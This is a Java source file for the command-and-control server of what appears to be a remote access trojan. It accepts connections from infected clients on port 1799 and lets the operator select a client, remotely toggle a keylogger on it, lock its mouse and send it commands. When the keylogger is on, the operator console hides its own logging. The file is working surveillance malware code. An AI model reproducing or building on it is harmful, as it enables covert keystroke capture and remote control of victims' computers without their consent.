package org.graviton.network;

import org.apache.mina.core.buffer.IoBuffer;
import org.apache.mina.core.service.IoHandler;
import org.apache.mina.core.session.IdleStatus;
import org.apache.mina.core.session.IoSession;
import org.apache.mina.transport.socket.nio.NioSocketAcceptor;
import org.apache.mina.util.CopyOnWriteMap;
import org.graviton.network.media.MediaServer;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.charset.CharacterCodingException;
import java.nio.charset.Charset;
import java.util.Collection;
import java.util.Map;
import java.util.stream.IntStream;

public class Server implements IoHandler {
    private static final int PORT = 1799;

    private static Server instance;

    private static Map<Integer, Client> clients = new CopyOnWriteMap<>();

    private Client selectedClient;

    private boolean keyLoggerEnabled;

    private boolean silent;

    public Server() throws IOException {
        NioSocketAcceptor socketAcceptor = new NioSocketAcceptor();
        socketAcceptor.setHandler(this);
        socketAcceptor.bind(new InetSocketAddress(PORT));
        System.out.println("Listening to port " + PORT + " ...");
        Server.instance = this;
    }

    private static IoBuffer stringToBuffer(String packet) {
        return IoBuffer.allocate(4096).put(packet.getBytes()).flip();
    }

    private static String bufferToString(Object buffer) {
        try {
            return IoBuffer.allocate(4096).put((IoBuffer) buffer).flip().getString(Charset.forName("UTF-8").newDecoder());
        } catch (CharacterCodingException e) {
            return "undefined";
        }
    }

    public static Server getInstance() {
        return instance;
    }

    public static Collection<Client> clients() {
        return clients.values();
    }

    private void send(Client client, String data) {
        client.getSession().write(stringToBuffer(data));
    }

    public void send(String data) {
        if (selectedClient != null)
            send(selectedClient, data);
        else
            System.err.println("No client selected");
    }

    public void switchMouseState(String extra) {
        if (selectedClient != null) {
            if (extra.equals("lock") || extra.equals("unlock")) {
                send("1" + (extra.equals("lock") ? "1" : "0"));
                System.out.println("Update mouse state of client[" + selectedClient.getSession().getId() + "] : " + extra.toUpperCase());
            } else {
                System.err.println("Invalid mouse args {" + extra + "}");
            }
        }
    }

    public void switchKeyLogger() {
        if (selectedClient == null) {
            System.err.println("No client selected");
            return;
        }

        keyLoggerEnabled = !keyLoggerEnabled;
        if (keyLoggerEnabled) {
            IntStream.range(0, 9999).forEach(i -> System.out.println("\n"));
            System.err.println("KeyLogger : enabled...");
            silent = true;
        } else {
            IntStream.range(0, 9999).forEach(i -> System.out.println("\n"));
            System.err.println("KeyLogger : disabled");
            silent = false;
        }
        send("2");
    }

    @Override
    public void sessionCreated(IoSession ioSession) throws Exception {
        selectedClient = new Client(ioSession);
        clients.put((int) ioSession.getId(), selectedClient);
        ioSession.setAttribute("client", selectedClient);
    }

    @Override
    public void sessionOpened(IoSession ioSession) throws Exception {
        if (!silent)
            System.out.println("Client[" + ioSession.getId() + "] is connected");
    }

    @Override
    public void sessionClosed(IoSession ioSession) throws Exception {
        if (selectedClient != null && ioSession.getId() == selectedClient.getSession().getId()) {
            if (!silent)
                System.out.println("Current client is now disconnected");
            selectedClient = null;
        } else if (!silent)
            System.out.println("Client[" + ioSession.getId() + "] is closed");

        clients.remove((int) ioSession.getId());
    }

    @Override
    public void sessionIdle(IoSession ioSession, IdleStatus idleStatus) throws Exception {
    }

    @Override
    public void exceptionCaught(IoSession ioSession, Throwable throwable) throws Exception {
        throwable.printStackTrace();
        if (!silent)
            System.out.println("Client[" + ioSession.getId() + "] throw an exception -> " + throwable.getMessage());
    }

    @Override
    public void messageReceived(IoSession ioSession, Object o) throws Exception {
        String input = bufferToString(o);
        if (!silent)
            System.out.println("Client[" + ioSession.getId() + "] < " + input);
        ((Client) ioSession.getAttribute("client")).parse(input);
    }

    @Override
    public void messageSent(IoSession ioSession, Object o) throws Exception {
        if (!silent)
            System.out.println("Server to [" + ioSession.getId() + "] > " + bufferToString(o));
    }

    @Override
    public void inputClosed(IoSession ioSession) throws Exception {

    }

    public void selectClient(String args) {
        try {
            int id = Integer.parseInt(args);
            if (clients.containsKey(id)) {
                this.selectedClient = clients.get(Integer.parseInt(args));
                System.out.println("Client[" + args + "] is now selected");
            } else
                System.err.println("Cannot find client[" + args + "]");

        } catch (Exception e) {
            System.err.println("Cannot identify client params:" + args);
        }
    }

    public Client getSelectedClient() {
        return this.selectedClient;
    }
}
